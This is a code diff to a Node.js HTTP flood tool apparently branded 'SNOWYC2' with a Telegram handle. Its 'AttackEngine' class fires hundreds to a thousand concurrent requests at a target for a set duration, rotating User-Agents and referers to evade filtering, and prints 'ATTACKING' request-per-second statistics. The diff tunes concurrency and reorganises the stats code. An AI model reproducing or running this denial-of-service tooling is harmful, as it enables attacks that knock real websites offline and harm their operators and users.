@@ -7,12 +7,11 @@ const process = require('process');
 const readline = require('readline');
 const pLimit = require('p-limit').default;
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 128, 2000);  // Max concurrency based on CPU threads (8 CPUs -> 128 threads per core)
+const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1000);  // More aggressive concurrency (up to 1000)
 const REQUEST_TIMEOUT = 10000;
-const ANIMATION = ['|', '/', '-', '\\'];
 
 const REFERERS = loadLines('refs.txt');
-const USER_AGENTS = loadLines('ua.txt');  // Use ua.txt for User-Agent rotation
+const USER_AGENTS = loadLines('ua.txt'); // Updated from ua.txt
 
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
@@ -46,7 +45,7 @@ class AttackEngine {
         this.duration = duration * 1000;
         this.startTime = Date.now();
         this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
-        this.limit = pLimit(MAX_CONCURRENT);
+        this.limit = pLimit(MAX_CONCURRENT); // Max concurrent requests
     }
 
     async makeRequest() {
@@ -69,24 +68,16 @@ class AttackEngine {
         }
     }
 
-    displayStats() {
-        const elapsed = (Date.now() - this.startTime) / 1000;
-        const rps = (this.stats.total / elapsed).toFixed(1);
-        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
-        const spin = ANIMATION[this.spinnerIndex++ % ANIMATION.length];
-        process.stdout.write(
-            `\r${spin} ATTACKING | RPS: ${rps} | SUCCESS: ${this.stats.success} | ERRORS: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
-        );
-    }
-
     async runLoop() {
+        // Loop to fire requests concurrently without waiting for each one
         const promises = Array.from({ length: MAX_CONCURRENT }, () =>
             this.limit(() => this.makeRequest())
         );
-        const results = await Promise.allSettled(promises);
+        const results = await Promise.all(promises);
+
         results.forEach(res => {
             this.stats.total++;
-            if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
+            if (res === 'SUCCESS') {
                 this.stats.success++;
             } else {
                 this.stats.errors++;
@@ -94,16 +85,26 @@ class AttackEngine {
         });
     }
 
-    async runAttack() {
-        const statInterval = setInterval(() => this.displayStats(), 200);
+    displayStats() {
+        const elapsed = (Date.now() - this.startTime) / 1000;
+        const rps = (this.stats.total / elapsed).toFixed(1);
+        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
+        process.stdout.write(
+            `\rATTACKING | RPS: ${rps} | SUCCESS: ${this.stats.success} | ERRORS: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
+        );
+    }
 
+    async runAttack() {
+        const statInterval = setInterval(() => this.displayStats(), 200); // Stats update
+
+        // Fire requests until the duration is up
         while (Date.now() - this.startTime < this.duration) {
-            await this.runLoop(); // Keep running as fast as possible without waiting
+            await this.runLoop();
         }
 
-        clearInterval(statInterval);
-        process.stdout.write('\n');
-        this.printSummary();
+        clearInterval(statInterval); // Stop stats update
+        process.stdout.write('\n');  // Move to a new line after completion
+        this.printSummary();  // Print final stats
     }
 
     printSummary() {
@@ -122,9 +123,9 @@ class AttackEngine {
     }
 }
 
-// Main
+// Main function to start attack
 (async () => {
-    console.log('\nSNOWY2 - T.ME/STSVKINGDOM');
+    console.log('\nSNOWYC2 - T.ME/STSVKINGDOM');
     console.log('='.repeat(60));
 
     const rl = readline.createInterface({
